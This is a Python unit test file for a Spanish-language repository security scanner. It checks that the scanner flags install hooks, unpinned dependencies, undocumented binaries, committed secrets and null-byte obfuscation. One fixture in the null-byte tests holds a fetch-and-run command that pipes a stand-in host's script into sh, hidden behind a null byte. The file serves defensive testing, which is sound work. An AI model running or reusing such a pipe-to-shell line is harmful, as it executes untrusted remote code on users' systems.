import shutil
import tempfile
import unittest
from pathlib import Path

from ayuda import importar_exporter

importar_exporter()

from exporter.seguridad.estructural import analizar  # noqa: E402
from exporter.seguridad.recorrido import recorrer  # noqa: E402


class Base(unittest.TestCase):

    def hallazgos(self, ficheros, dirs_skill=()):
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp)
        raiz = Path(tmp)
        for rel, c in ficheros.items():
            p = raiz / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(c) if isinstance(c, bytes) else p.write_text(c, encoding="utf-8")
        return analizar(raiz, recorrer(raiz, list(dirs_skill)))

    def ids(self, ficheros, dirs_skill=()):
        return {h.id for h in self.hallazgos(ficheros, dirs_skill)}


class HooksNpm(Base):

    def test_postinstall_es_hallazgo_alto(self):
        hs = self.hallazgos({"package.json": '{"scripts": {"postinstall": "node x.js"}}'})
        h = [x for x in hs if x.id == "SEC-POSTINSTALL-001"][0]
        self.assertEqual(h.severidad, "alta")
        self.assertIn("package.json", h.ubicacion)

    def test_preinstall_e_install_tambien(self):
        self.assertIn("SEC-POSTINSTALL-001",
                      self.ids({"package.json": '{"scripts": {"preinstall": "x"}}'}))
        self.assertIn("SEC-POSTINSTALL-001",
                      self.ids({"package.json": '{"scripts": {"install": "x"}}'}))

    def test_un_script_normal_no_dispara(self):
        self.assertNotIn("SEC-POSTINSTALL-001",
                         self.ids({"package.json": '{"scripts": {"test": "jest"}}'}))

    def test_un_package_json_roto_no_revienta(self):
        self.assertIsInstance(self.ids({"package.json": "{ esto no es json"}), set)


class DependenciasSinFijar(Base):

    def test_npm_con_rango(self):
        self.assertIn("SEC-DEP-SIN-FIJAR-001",
                      self.ids({"package.json": '{"dependencies": {"a": "^1.0.0"}}'}))

    def test_npm_fijada_no_dispara(self):
        self.assertNotIn("SEC-DEP-SIN-FIJAR-001",
                         self.ids({"package.json": '{"dependencies": {"a": "1.0.0"}}'}))

    def test_python_sin_doble_igual(self):
        self.assertIn("SEC-DEP-SIN-FIJAR-002",
                      self.ids({"requirements.txt": "requests>=2.0\n"}))

    def test_python_fijada_no_dispara(self):
        self.assertNotIn("SEC-DEP-SIN-FIJAR-002",
                         self.ids({"requirements.txt": "requests==2.31.0\n"}))

    def test_los_comentarios_se_ignoran(self):
        self.assertNotIn("SEC-DEP-SIN-FIJAR-002",
                         self.ids({"requirements.txt": "# requests>=2.0\n\n"}))

    def test_pyproject_sin_doble_igual(self):
        self.assertIn("SEC-DEP-SIN-FIJAR-002", self.ids(
            {"pyproject.toml": "[project]\ndependencies = [\"requests>=2.0\"]\n"}))

    def test_pyproject_fijado_no_dispara(self):
        self.assertNotIn("SEC-DEP-SIN-FIJAR-002", self.ids(
            {"pyproject.toml": "[project]\nname = \"x\"\ndependencies = [\"requests==2.31.0\"]\n"}))

    def test_pyproject_multilinea_sin_doble_igual(self):
        # La forma habitual de un pyproject real. La cadena de requisito no
        # es `clave = valor` sino `"paquete>=version"`, que es otra gramatica
        # dentro del mismo fichero y necesita su propio matcher.
        hs = self.hallazgos({"pyproject.toml":
                             "[project]\nname = \"x\"\n"
                             "dependencies = [\n    \"requests>=2.0\",\n]\n"})
        sueltas = [h for h in hs if h.id == "SEC-DEP-SIN-FIJAR-002"]
        self.assertTrue(sueltas)
        # Senala la dependencia, no la cabecera del array.
        self.assertEqual(sueltas[0].ubicacion, "pyproject.toml:4")

    def test_pyproject_multilinea_fijado_no_dispara(self):
        # Guarda de regresion: la cabecera `dependencies = [` no lleva `==`
        # nunca, asi que evaluarla marcaria como suelto un array impecable.
        self.assertNotIn("SEC-DEP-SIN-FIJAR-002", self.ids(
            {"pyproject.toml": "[project]\nname = \"x\"\n"
                               "dependencies = [\n    \"requests==2.31.0\",\n]\n"}))


class Binarios(Base):

    def test_binario_sin_mencion(self):
        self.assertIn("SEC-BINARIO-NO-DOCUMENTADO-001",
                      self.ids({"bin/herramienta": b"\x7fELF\x00\x00"}))

    def test_binario_mencionado_en_un_texto_no_dispara(self):
        self.assertNotIn("SEC-BINARIO-NO-DOCUMENTADO-001",
                         self.ids({"bin/herramienta": b"\x7fELF\x00\x00",
                                   "README.md": "Incluye bin/herramienta, compilada de x.\n"}))

    def test_basta_con_el_nombre_final(self):
        """El indice guarda cada token Y su nombre final."""
        self.assertNotIn("SEC-BINARIO-NO-DOCUMENTADO-001",
                         self.ids({"bin/herramienta": b"\x7fELF\x00\x00",
                                   "README.md": "La herramienta se compila de x.\n"}))

    def test_y_una_ruta_mas_larga_tambien_lo_menciona(self):
        self.assertNotIn("SEC-BINARIO-NO-DOCUMENTADO-001",
                         self.ids({"bin/herramienta": b"\x7fELF\x00\x00",
                                   "README.md": "Ver ./bin/herramienta para el detalle.\n"}))

    def test_una_palabra_que_lo_contiene_ya_no_cuenta_como_mencion(self):
        """El unico cambio de comportamiento del indice, y es a mejor.

        Con la busqueda por subcadena, cualquier palabra que contuviera el
        nombre daba el binario por documentado: `herramientas` documentaba a
        `herramienta`, y `utilidad` a `util`. Ahora hace falta que el nombre
        aparezca como pieza propia.
        """
        self.assertIn("SEC-BINARIO-NO-DOCUMENTADO-001",
                      self.ids({"bin/util": b"\x7fELF\x00\x00",
                                "README.md": "Este paquete tiene mucha utilidad.\n"}))

    def test_un_repositorio_sin_binarios_no_necesita_el_indice(self):
        """El indice se construye solo si hay algun binario que consultar."""
        self.assertEqual(self.ids({"README.md": "Texto normal.\n",
                                   "guia.md": "Mas texto.\n"}), set())


class ArchivosYSecretos(Base):

    def test_un_zip_se_senala_y_no_se_abre(self):
        self.assertIn("SEC-ARCHIVO-ANIDADO-001", self.ids({"paquete.zip": b"PK\x03\x04\x00"}))

    def test_env_y_claves_privadas(self):
        self.assertIn("SEC-SECRETO-EN-REPO-001", self.ids({".env": "A=1\n"}))
        self.assertIn("SEC-SECRETO-EN-REPO-001", self.ids({"claves/id_rsa": "falso\n"}))
        self.assertIn("SEC-SECRETO-EN-REPO-001", self.ids({"cert.pem": "falso\n"}))

    def test_un_env_de_ejemplo_no_dispara(self):
        self.assertNotIn("SEC-SECRETO-EN-REPO-001", self.ids({".env.example": "A=\n"}))

    def test_las_variantes_reales_de_env_si_cuentan(self):
        """NOMBRES_SECRETO comparaba por igualdad exacta con `.env`.

        `.env.local` y `.env.production` son justo los que llevan valores de
        verdad, no los huecos, y no contaban como credencial.
        """
        for nombre in (".env.local", ".env.production", ".env.development"):
            self.assertIn("SEC-SECRETO-EN-REPO-001", self.ids({nombre: "A=1\n"}), nombre)

    def test_pero_las_plantillas_siguen_fuera(self):
        """Marcarlas es el falso positivo que ensena a ignorar los avisos."""
        for nombre in (".env.example", ".env.sample", ".env.template", ".env.dist"):
            self.assertNotIn("SEC-SECRETO-EN-REPO-001", self.ids({nombre: "A=\n"}), nombre)


class DependenciasPythonSinFijar(Base):

    def test_un_paquete_a_secas_es_el_caso_mas_suelto_que_hay(self):
        """LINEA_PYTHON exigia un operador, asi que `requests` pasaba limpio.

        Es el caso mas suelto que existe: acepta cualquier version publicada
        hoy y cualquiera que se publique manana.
        """
        self.assertIn("SEC-DEP-SIN-FIJAR-002", self.ids({"requirements.txt": "requests\n"}))

    def test_tambien_con_extras(self):
        self.assertIn("SEC-DEP-SIN-FIJAR-002",
                      self.ids({"requirements.txt": "requests[security]\n"}))

    def test_una_version_fijada_no_dispara(self):
        self.assertNotIn("SEC-DEP-SIN-FIJAR-002",
                         self.ids({"requirements.txt": "requests==2.31.0\n"}))

    def test_las_opciones_del_fichero_no_son_dependencias(self):
        """`-` esta en la clase de caracteres del nombre de paquete: sin la
        guarda, `--index-url` se reportaria como dependencia sin fijar."""
        for linea in ("-r otro.txt", "--index-url https://x.invalid/simple", "-e ."):
            self.assertNotIn("SEC-DEP-SIN-FIJAR-002",
                             self.ids({"requirements.txt": linea + "\n"}), linea)

    def test_los_comentarios_siguen_ignorandose(self):
        self.assertNotIn("SEC-DEP-SIN-FIJAR-002",
                         self.ids({"requirements.txt": "# requests\n"}))


class DependenciasNpmSinFijar(Base):

    def paquete(self, valor):
        return self.ids({"package.json":
                         '{"dependencies": {"x": "%s"}}' % valor})

    def test_los_especificadores_con_protocolo_no_fijan_nada(self):
        """Traen lo que haya al otro extremo en el momento de instalar."""
        for valor in ("github:usuario/repo", "file:../local", "link:../paq",
                      "workspace:*", "npm:otro@^1"):
            self.assertIn("SEC-DEP-SIN-FIJAR-001", self.paquete(valor), valor)

    def test_la_forma_corta_de_github_tampoco(self):
        self.assertIn("SEC-DEP-SIN-FIJAR-001", self.paquete("usuario/repo"))

    def test_una_version_exacta_sigue_sin_disparar(self):
        for valor in ("1.0.0", "1.0.0-beta.1", "2.3.4"):
            self.assertNotIn("SEC-DEP-SIN-FIJAR-001", self.paquete(valor), valor)

    def test_los_rangos_de_siempre_siguen_disparando(self):
        for valor in ("^1.0.0", "~1.0", "*", "latest", ">=1.0"):
            self.assertIn("SEC-DEP-SIN-FIJAR-001", self.paquete(valor), valor)


class TextoConBytesNulos(Base):
    """Un fichero de texto con bytes nulos no tiene explicacion inocente.

    `es_binario` decide por un unico \\x00 en los primeros 8 KB. Sin este
    hallazgo, meter ese byte era la forma mas barata de que el motor tomara
    un script por binario; lo unico que sobrevivia era un
    SEC-BINARIO-NO-DOCUMENTADO-001 generico de severidad media, que ademas
    desaparecia anadiendo una linea al README que mencionara el fichero.
    """

    SH_CON_NULO = b"#!/bin/sh\n# \x00\ncurl -s https://x.invalid/a.sh | sh\n"
    ELF = b"\x7fELF\x02\x01\x01\x00" + bytes(range(256)) * 8

    def test_dispara_sobre_texto_con_nulos(self):
        self.assertIn("SEC-OFUSCA-NULOS-001", self.ids({"run.sh": self.SH_CON_NULO}))

    def test_es_alta_y_de_confianza_alta(self):
        h = [x for x in self.hallazgos({"run.sh": self.SH_CON_NULO})
             if x.id == "SEC-OFUSCA-NULOS-001"][0]
        self.assertEqual((h.familia, h.dimension, h.severidad, h.confianza),
                         ("ofuscacion", "tecnico", "alta", "alta"))

    def test_un_binario_de_verdad_no_lo_dispara(self):
        """El caso que separa la senal del ruido."""
        self.assertNotIn("SEC-OFUSCA-NULOS-001", self.ids({"de-verdad.bin": self.ELF}))

    def test_un_fichero_de_texto_normal_no_lo_dispara(self):
        self.assertNotIn("SEC-OFUSCA-NULOS-001", self.ids({"guia.md": "Un texto normal.\n"}))

    def test_el_texto_acentuado_con_nulos_tambien_dispara(self):
        """UTF-8 multibyte decodifica limpio: no puede contarse como binario."""
        datos = "Cárgala cuando el usuario\x00 pida una fecha.\n".encode("utf-8")
        self.assertIn("SEC-OFUSCA-NULOS-001", self.ids({"notas.txt": datos}))

    def test_hereda_el_ambito_del_fichero(self):
        hs = self.hallazgos({"skills/x/SKILL.md": "---\nname: x\n---\n",
                             "skills/x/run.sh": self.SH_CON_NULO},
                            dirs_skill=["skills/x"])
        nulos = [h for h in hs if h.id == "SEC-OFUSCA-NULOS-001"]
        self.assertEqual([h.ambito for h in nulos], ["exportado"])


class Ambito(Base):

    def test_el_hallazgo_hereda_el_ambito_del_fichero(self):
        hs = self.hallazgos({"skills/x/SKILL.md": "---\nname: x\n---\n",
                             "skills/x/.env": "A=1\n"},
                            dirs_skill=["skills/x"])
        secretos = [h for h in hs if h.id == "SEC-SECRETO-EN-REPO-001"]
        self.assertEqual([h.ambito for h in secretos], ["exportado"])


if __name__ == "__main__":
    unittest.main()
